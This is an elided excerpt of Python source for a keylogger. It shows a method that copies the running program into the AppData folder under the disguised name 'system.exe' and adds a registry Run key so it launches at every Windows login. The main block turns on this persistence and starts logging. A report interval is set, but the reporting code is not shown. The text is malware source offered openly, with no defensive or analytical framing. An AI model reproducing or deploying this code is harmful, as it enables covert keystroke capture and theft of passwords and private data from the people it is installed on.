...
SEND_REPORT_EVERY = #INTERVAL_TIME
...
class Keylogger: 
    ...
    def become_persistent_on_windows(self):
        troll = os.environ["appdata"] + "\\system.exe"
        if not os.path.exists(troll):
            shutil.copyfile(sys.executable, troll)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v system /t REG_SZ /d "' + troll + '"', shell=True)
...
if __name__ == "__main__":
    ...
    keylogger.become_persistent_on_windows()    
    keylogger.start()
